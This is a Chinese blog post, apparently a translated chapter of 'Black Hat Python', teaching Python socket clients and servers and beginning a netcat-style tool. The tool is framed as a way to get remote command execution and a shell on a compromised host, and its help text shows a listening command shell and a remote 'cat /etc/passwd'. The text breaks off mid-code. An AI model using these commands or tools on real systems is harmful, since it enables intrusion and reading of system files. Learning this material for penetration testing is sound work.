<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 2 | Ma9icCR</title><meta name="description" content="基本网络工具网络永远是黑客最具有诱惑的舞台。通过简单的网络访问，攻击者几乎可以做任何事情，比如扫描主机、注入数据包、嗅探数据和远程控制主机。但是，如果您已经深入到企业目标的最深处，您可能会发现自己遇到了一个难题：您没有工具来实施网络攻击。没有netcat、Wireshark、没有编译器，也没办法安装。但是，您可能会惊讶地发现，在许多情况下，目标安装了Python。那我们从这里开始吧。 本章将为您提"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-2/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 2"><meta property="og:url" content="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-2/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="基本网络工具网络永远是黑客最具有诱惑的舞台。通过简单的网络访问，攻击者几乎可以做任何事情，比如扫描主机、注入数据包、嗅探数据和远程控制主机。但是，如果您已经深入到企业目标的最深处，您可能会发现自己遇到了一个难题：您没有工具来实施网络攻击。没有netcat、Wireshark、没有编译器，也没办法安装。但是，您可能会惊讶地发现，在许多情况下，目标安装了Python。那我们从这里开始吧。 本章将为您提"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-06-21T10:33:16.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:09.446Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 3" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-3/"><link rel="next" title="Black Hat Python 2nd 1" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-1/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:09'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">36</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">14</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本网络工具"><span class="toc-number">1.</span> <span class="toc-text">基本网络工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#短评Python网络"><span class="toc-number">1.1.</span> <span class="toc-text">短评Python网络</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP客户端"><span class="toc-number">1.2.</span> <span class="toc-text">TCP客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDP客户端"><span class="toc-number">1.3.</span> <span class="toc-text">UDP客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP服务端"><span class="toc-number">1.4.</span> <span class="toc-text">TCP服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代替Netcat"><span class="toc-number">1.5.</span> <span class="toc-text">代替Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.5.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构建TCP代理"><span class="toc-number">1.6.</span> <span class="toc-text">构建TCP代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-with-Paramiko"><span class="toc-number">1.7.</span> <span class="toc-text">SSH with Paramiko</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH隧道"><span class="toc-number">1.8.</span> <span class="toc-text">SSH隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-3"><span class="toc-number">1.8.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 2</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-06-21 18:33:16"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-06-21</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:09"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="基本网络工具"><a href="#基本网络工具" class="headerlink" title="基本网络工具"></a>基本网络工具</h1><p>网络永远是黑客最具有诱惑的舞台。通过简单的网络访问，攻击者几乎可以做任何事情，比如扫描主机、注入数据包、嗅探数据和远程控制主机。但是，如果您已经深入到企业目标的最深处，您可能会发现自己遇到了一个难题：您没有工具来实施网络攻击。没有netcat、Wireshark、没有编译器，也没办法安装。但是，您可能会惊讶地发现，在许多情况下，目标安装了Python。那我们从这里开始吧。</p>
<p>本章将为您提供一些使用 <em>socket</em> 模块的Python网络基础(完整的<em>socket</em>文档可以在这里找到：<a href="http://docs.python.org/3/library/socket.html" target="_blank" rel="noopener">http://docs.python.org/3/library/socket.html</a>。)在此过程中，我们将构建客户端、服务器端和TCP代理。然后，我们将把它们转换为我们自己的netcat，并可完成一个命令shell。本章是后续章节的基础，我们将构建一个主机探测工具，实现跨平台嗅探器，并创建一个远程木马框架。让我们开始吧。</p>
<h2 id="短评Python网络"><a href="#短评Python网络" class="headerlink" title="短评Python网络"></a>短评Python网络</h2><p>程序员可以使用许多第三方工具在Python中创建联网的服务器端和客户端，但所有这些工具的核心模块都是 <em>socket</em> (套接字)。该模块公开了快速编写传输控制协议(TCP)和用户数据报协议(UDP)客户端和服务端、使用原始套接字等所需的所有部分。为了入侵或维护对目标机器的访问通路，这个模块是您真正需要的。让我们从创建一些简单的客户端和服务端开始——这是您将编写的两个最常见的快速网络脚本。</p>
<h2 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h2><p>在渗透测试期间，我们(作者)无数次需要快速创建TCP客户端来测试服务、发送垃圾数据、模糊测试或执行各种数量级的其他任务。如果您在大型企业环境的范围内工作，您将无法奢侈地使用网络工具或编译器，有时您甚至会失去所有基础能力，如复制、粘贴或连接到互联网的能力。这就是急需快速创建TCP客户端的情况。废话少说，让我们开始编码吧。下面是一个简单的TCP客户端:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host = <span class="string">"www.google.com"</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"><span class="comment"># create a socket object</span></span><br><span class="line">[<span class="number">1</span>] client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect the client</span></span><br><span class="line">[<span class="number">2</span>] client.connect((target_host,target_port))</span><br><span class="line"><span class="comment"># send some data</span></span><br><span class="line">[<span class="number">3</span>] client.send(<span class="string">b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n"</span>)</span><br><span class="line"><span class="comment"># receive some data</span></span><br><span class="line">[<span class="number">4</span>] response = client.recv(<span class="number">4096</span>)</span><br><span class="line">print(response.decode())</span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>

<p>我们首先[1]用 <em>AF_INET</em> 和 <em>SOCK_STREAM</em> 参数创建一个套接字对象。<em>AF_INET</em>参数表示我们将使用标准IPv4地址或主机名，而<em>SOCK_STREAM</em>表示这将是一个TCP客户端。然后我们在第[2]部分将客户端连接到服务器端，并在[3]处将一些数据以字节的形式发送给它。最后一步[4]是接收回传一些数据并打印响应情况，然后关闭套接字。这是最简单的TCP客户端形式，但也是你将最常写的一种。</p>
<p>此代码片段对套接字做了一些必要的假设，您肯定想要知道它们。第一个假设是我们的连接总是成功的，第二个假设是服务器希望我们先发送数据(一些服务器希望先发送数据给您，然后等待您的响应)。我们的第三个假设是，服务器将总是及时地向我们返回数据。我们做这些假设主要是为了简单。虽然程序员对如何处理阻塞套接字、套接字中的异常处理等问题有不同的看法，但渗透测试人员很少在他们用于侦查或开发工作的快速而粗糙的工具中注意这些细节，所以我们在本章中也将省略它们。</p>
<h2 id="UDP客户端"><a href="#UDP客户端" class="headerlink" title="UDP客户端"></a>UDP客户端</h2><p>Python UDP客户端与TCP客户端没有太大的区别；我们只需要做两个小的改变来让它以UDP形式发送数据包：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">target_port = <span class="number">9997</span></span><br><span class="line"><span class="comment"># create a socket object</span></span><br><span class="line">[<span class="number">1</span>] client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># send some data</span></span><br><span class="line">[<span class="number">2</span>] client.sendto(<span class="string">b"AAABBBCCC"</span>,(target_host,target_port))</span><br><span class="line"><span class="comment"># receive some data</span></span><br><span class="line">[<span class="number">3</span>] data, addr = client.recvfrom(<span class="number">4096</span>)</span><br><span class="line">print(data.decode())</span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>

<p>如您所见，在创建套接字对象时，在[1]处我们将套接字类型更改为 <em>SOCK_DGRAM</em> 。第[2]步是简单地调用<em>sendto()</em>，参数是要传递的数据和要发送数据的目标服务端。因为UDP是无连接的协议，所以事先不需要调用<em>connect()</em>。最后一步[3]是调用<em>recvfrom()</em>来接收UDP数据。您还将注意到，它会同时返回数据和远程主机及端口的详细信息。</p>
<p>再说一次，我们并不想成为优秀的网络程序员；我们希望我们的程序工具它能够快速、简单、可靠地处理我们的日常黑客任务。下面让我们继续创建一些简单的服务器。</p>
<h2 id="TCP服务端"><a href="#TCP服务端" class="headerlink" title="TCP服务端"></a>TCP服务端</h2><p>在Python中创建TCP服务器就像创建客户端一样简单。在编写命令shell或创建代理(这两项我们将在后面进行)时，您可能希望使用自己的TCP服务器。让我们首先创建一个标准的多线程TCP服务器。编写如下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">IP = <span class="string">'0.0.0.0'</span></span><br><span class="line">PORT = <span class="number">9998</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((IP, PORT)) [<span class="number">1</span>]</span><br><span class="line">    server.listen(<span class="number">5</span>) [<span class="number">2</span>]</span><br><span class="line">    print(<span class="string">f'[*] Listening on <span class="subst">&#123;IP&#125;</span>:<span class="subst">&#123;PORT&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client, address = server.accept() [<span class="number">3</span>]</span><br><span class="line">        print(<span class="string">f'[*] Accepted connection from <span class="subst">&#123;address[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;address[<span class="number">1</span>]&#125;</span>'</span>)</span><br><span class="line">        client_handler = threading.Thread(target=handle_client, args=(client,))</span><br><span class="line">        client_handler.start() [<span class="number">4</span>]</span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span> [<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">with</span> client_socket <span class="keyword">as</span> sock:</span><br><span class="line">        request = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">f'[*] Received: <span class="subst">&#123;request.decode(<span class="string">"utf-8"</span>)&#125;</span>'</span>)</span><br><span class="line">        sock.send(<span class="string">b'ACK'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>首先，我们在[1]设置希望服务器监听的IP地址和端口。接下来在[2]处，我们让服务器开始监听，将最大的连接数量设置为5。然后我们将服务器端放入主循环中，在这里它将等待一个传入的连接。在[3]处当有客户端连接时，我们在 <em>client</em> 变量中接收客户端套接字，在 <em>address</em> 变量中接收远程连接的细节信息。然后创建一个指向 <em>handle_client</em> 函数的新线程对象，并将客户端套接字对象作为参数传递给它。然后我们在[4]处启动线程来处理客户端连接，此时主服务器循环已经准备好处理另一个传入连接。[5]处<em>handle_client</em>函数执行<em>recv()</em>，然后向客户端发送一条简单的消息。</p>
<p>如果使用我们之前构建的TCP客户端，可以向服务器端发送一些测试数据包。你应该看到如下输出:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9998</span></span><br><span class="line">[*] Accepted connection <span class="keyword">from</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62512</span></span><br><span class="line">[*] Received: ABCDEF</span><br></pre></td></tr></table></figure>

<p>就是这样！虽然非常简单，但这是一段非常有用的代码。在接下来的几节中，我们将会对它进行扩展，构建netcat的替换工具和TCP代理。</p>
<h2 id="代替Netcat"><a href="#代替Netcat" class="headerlink" title="代替Netcat"></a>代替Netcat</h2><p>Netcat是网络中的“瑞士军刀”，所以精明的系统管理员从他们的系统中删除它也就不足为奇了。如果攻击者设法找到了进入的方法，那么这样一个工具将是相当有用的东西。有了它，您可以通过网络读写数据，这意味着您可以使用它来执行远程命令、远程上传和下载文件，甚至打开远程shell。我们不止一次遇到没有安装netcat但有Python的服务器。在这些情况下，创建一个简单的网络客户端和服务器(可以用来传输文件)或一个监听器(提供命令行的访问)是很有用的。如果你是通过一个web应用程序入侵的，那么部署一个Python回调程序绝对值得，这样您无需先使用特洛伊木马程序或后门即可获得二次访问权限。创建这样一个工具也是一个很棒的Python练习，所以让我们开始编写 <em>netcat.py</em> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    cmd = cmd.strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    [<span class="number">1</span>] output = subprocess.check_output(shlex.split(cmd),</span><br><span class="line">                                     stderr=subprocess.STDOUT)</span><br><span class="line">    <span class="keyword">return</span> output.decode()</span><br></pre></td></tr></table></figure>

<p>这里我们导入所有必要的库并设置execute函数，该函数实现接收命令和运行，并将输出作为字符串返回。这个函数包含一个我们还没有介绍的新库： <em>subprocess</em> 库。该库提供了一个强大的进程创建接口，为您提供了许多与客户端程序交互的方法。在[1]处，我们使用它的 <em>check_output</em> 函数，该函数在本地操作系统上运行命令，然后返回该命令输出。</p>
<p>现在，让我们创建负责处理命令行参数和调用其余函数的主块:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser( [<span class="number">1</span>]</span><br><span class="line">        description=<span class="string">'BHP Net Tool'</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=textwrap.dedent(<span class="string">'''Example: [2]</span></span><br><span class="line"><span class="string">            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell</span></span><br><span class="line"><span class="string">            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file</span></span><br><span class="line"><span class="string">            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command</span></span><br><span class="line"><span class="string">            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135</span></span><br><span class="line"><span class="string">            netcat.py -t 192.168.1.108 -p 5555 # connect to server</span></span><br><span class="line"><span class="string">        '''</span>))</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'command shell'</span>) [<span class="number">3</span>]</span><br><span class="line">    parser.add_argument(<span class="string">'-e'</span>, <span class="string">'--execute'</span>, help=<span class="string">'execute specified command'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-l'</span>, <span class="string">'--listen'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'listen'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=int, default=<span class="number">5555</span>, help=<span class="string">'specified port'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-t'</span>, <span class="string">'--target'</span>, default=<span class="string">'192.168.1.203'</span>, help=<span class="string">'specified IP'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--upload'</span>, help=<span class="string">'upload file'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.listen: [<span class="number">4</span>]</span><br><span class="line">        buffer = <span class="string">''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line">    nc = NetCat(args, buffer.encode())</span><br><span class="line">    nc.run()</span><br></pre></td></tr></table></figure>

<p>我们使用标准库中的 <em>argparse</em> 模块创建一个命令行接口[1]。我们将提供参数，以便可以调用它来上传文件、执行命令或启动命令shell。</p>
<p>我们提供了当用户使用 <em>–help</em> [2]调用程序时该程序将显示的示例用法，并添加六个参数来指定我们希望程序如何运行[3]。 <em>-c</em> 参数设置交互式shell,  <em>-e</em> 参数执行一个特定的命令, <em>-l</em> 参数表明建立一个监听器, <em>-p</em> 参数指定通信的端口， <em>-t</em> 参数指定了目标IP ，和 <em>-u</em> 参数指定要上传的文件名。发送方和接收方都可以使用这个程序，因此参数定义了是调用它来发送还是监听。<em>-c*、</em>-e<em>和</em>-u<em>参数意味着使用</em>-l<em>参数，因为这些参数只应用于通信的监听端。发送方连接到监听端，因此它只需要</em>-t<em>和</em>-p*参数来定义连接的目标监听器。</p>
<p>如果我们将它设置为一个监听器[4]，我们在调用 <em>NetCat</em> 对象的同时也需要一个空的缓冲区字符串。然后，我们从 <em>stdin</em> 发送缓冲区内容。最后，我们调用 <em>run</em> 函数来启动程序。</p>
<p>现在，让我们从客户端代码开始，开始为其中一些功能设置通路。在主块上面添加以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetCat</span>:</span></span><br><span class="line">    [<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, args, buffer=None)</span>:</span></span><br><span class="line">        self.args = args</span><br><span class="line">        self.buffer = buffer</span><br><span class="line">        [<span class="number">2</span>] self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span 